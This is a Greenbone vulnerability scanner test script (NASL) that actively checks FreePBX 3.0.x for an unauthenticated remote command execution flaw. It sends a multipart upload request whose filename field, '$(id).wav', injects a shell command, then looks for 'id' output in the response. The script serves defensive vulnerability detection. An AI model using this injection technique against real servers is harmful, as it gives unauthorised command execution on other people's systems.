# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freepbx:freepbx";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106236");
  script_version("2024-06-04T05:05:28+0000");
  script_tag(name:"last_modification", value:"2024-06-04 05:05:28 +0000 (Tue, 04 Jun 2024)");
  script_tag(name:"creation_date", value:"2016-09-08 13:26:09 +0700 (Thu, 08 Sep 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("FreePBX 3.0.x RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_freepbx_http_detect.nasl");
  script_mandatory_keys("freepbx/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"FreePBX is prone to a unauthenticated remote command execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Freepbx is vulnerable to unauthenticated remote command
  execution due to multiple weak inputs validation as well as partial authentication bypass.");

  script_tag(name:"impact", value:"An unauthenticated remote attacker may execute arbitrary OS
  commands.");

  script_tag(name:"affected", value:"FreePBX version 3.0.x.");

  script_tag(name:"solution", value:"Update to version 13.0.154 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40345/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port: port);

vt_strings = get_vt_strings();
name = vt_strings["default"];
filename = vt_strings["lowercase"] + ".wav";

post_data = '
------------' + name + '
Content-Disposition: form-data; name="extension"

0
------------' + name + '
Content-Disposition: form-data; name="language"

en
------------' + name + '
Content-Disposition: form-data; name="filename"

' + filename + '
------------' + name + '
Content-Disposition: form-data; name="codec[1]"

gsm
------------' + name + '
Content-Disposition: form-data; name="id"

1
------------' + name + '
Content-Disposition: form-data; name="files[1]"; filename="$(id).wav"
ontent-Type: text/plain

' + name + ' Test for https://www.exploit-db.com/exploits/40345/

------------' + name;

req = http_post_put_req(port: port, url: dir + "/admin/ajax.php?module=music&command=upload", data: post_data,
                        add_headers: make_array("Content-Type", "multipart/form-data; boundary=----------" + name,
                                                "Referer", "http://" + host + "/admin/ajax.php"));
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 500") {
  r = eregmatch(pattern: '(uid=[0-9]+.*gid=[0-9]+[^.]+)', string: res);
  if (!isnull(r[1])) {
    report = "It was possible to execute the 'id' command on the remote host.\n\nResult: " + r[1] + "\n";
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
